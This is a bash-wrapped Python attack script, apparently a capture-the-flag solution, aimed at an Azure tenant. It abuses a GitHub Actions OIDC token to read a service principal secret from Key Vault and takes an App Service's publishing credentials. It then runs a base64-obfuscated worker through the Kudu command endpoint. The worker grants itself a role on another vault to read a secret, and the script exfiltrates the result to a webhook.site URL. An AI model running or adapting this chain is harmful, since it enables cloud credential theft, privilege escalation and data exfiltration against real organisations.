#!/usr/bin/env bash
python3 - <<'PY'
import base64
import json
import os
import time
import urllib.parse
import urllib.request

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CID = "72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG = "rg-tbl-reporting-prod-eus"
APP = "app-tbl-reporting-prod"
KV1 = "https://kv-tbl-prod-x3euoz.vault.azure.net"
EXF = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"

def read_json(req):
    return json.loads(urllib.request.urlopen(req, timeout=35).read().decode())

def get_json(url, token):
    return read_json(urllib.request.Request(url, headers={"Authorization": "Bearer " + token}))

def post_form(url, fields):
    data = urllib.parse.urlencode(fields).encode()
    return read_json(urllib.request.Request(url, data=data, method="POST"))

req_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
oidc = read_json(urllib.request.Request(req_url, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]

def oidc_token(scope):
    d = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
        "client_id": CID,
        "grant_type": "client_credentials",
        "scope": scope + "/.default",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc,
    })
    return d["access_token"]

vt = oidc_token("https://vault.azure.net")
sp_raw = get_json(KV1 + "/secrets/reporting-service-principal?api-version=7.4", vt)["value"]
sp = json.loads(sp_raw)
spcid = sp.get("appId") or sp.get("clientId") or sp.get("client_id")
spsec = sp.get("clientSecret") or sp.get("client_secret") or sp.get("password")
arm = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
    "client_id": spcid,
    "grant_type": "client_credentials",
    "client_secret": spsec,
    "scope": "https://management.azure.com/.default",
})["access_token"]

pub = read_json(urllib.request.Request(
    "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP + "/config/publishingcredentials/list?api-version=2023-01-01",
    data=b"{}", method="POST", headers={"Authorization": "Bearer " + arm, "Content-Type": "application/json"}))
ku = pub["properties"]["publishingUserName"]
kp = pub["properties"]["publishingPassword"]

worker = r"""import base64, json, os, time, urllib.parse, urllib.request, uuid
IE = os.environ.get("IDENTITY_ENDPOINT", "")
IH = os.environ.get("IDENTITY_HEADER", "")
MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
def token(resource):
    q = IE + "?resource=" + urllib.parse.quote(resource) + "&api-version=2019-08-01&mi_res_id=" + urllib.parse.quote(MIRES)
    req = urllib.request.Request(q, headers={"X-IDENTITY-HEADER": IH})
    return json.loads(urllib.request.urlopen(req, timeout=25).read().decode())["access_token"]
def oid(jwt):
    part = jwt.split(".")[1]
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part)).get("oid")
vt = token("https://vault.azure.net")
at = token("https://management.azure.com")
scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
url = "https://management.azure.com/" + scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(uuid.uuid4()) + "?api-version=2022-04-01"
body = json.dumps({"properties": {"roleDefinitionId": "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6", "principalId": oid(vt), "principalType": "ServicePrincipal"}}).encode()
try:
    req = urllib.request.Request(url, data=body, method="PUT", headers={"Authorization": "Bearer " + at, "Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=25).read()
except Exception:
    pass
time.sleep(25)
flag_url = "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
req = urllib.request.Request(flag_url, headers={"Authorization": "Bearer " + token("https://vault.azure.net")})
print(urllib.request.urlopen(req, timeout=25).read().decode())
"""
encoded = base64.b64encode(worker.encode()).decode()
command = "nohup python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
body = json.dumps({"command": command, "dir": "site/wwwroot"}).encode()
auth = base64.b64encode((ku + ":" + kp).encode()).decode()
req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization": "Basic " + auth, "Content-Type": "application/json"})
result = urllib.request.urlopen(req, timeout=40).read()
print(result.decode())
# Poll Kudu VFS for the detached worker result.
result_url = "https://" + APP + ".scm.azurewebsites.net/api/vfs/site/wwwroot/ctf_flag_result"
last = b""
for _ in range(36):
    try:
        rr = urllib.request.Request(result_url, headers={"Authorization": "Basic " + auth})
        last = urllib.request.urlopen(rr, timeout=20).read()
        text = last.decode(errors="replace")
        if text.strip() and ("DF26{" in text or "flag" in text.lower() or "value" in text.lower() or "Traceback" in text):
            print(text)
            urllib.request.urlopen(urllib.request.Request(EXF, data=last, method="POST", headers={"Content-Type": "application/json"}), timeout=20).read()
            break
    except Exception:
        pass
    time.sleep(5)
PY
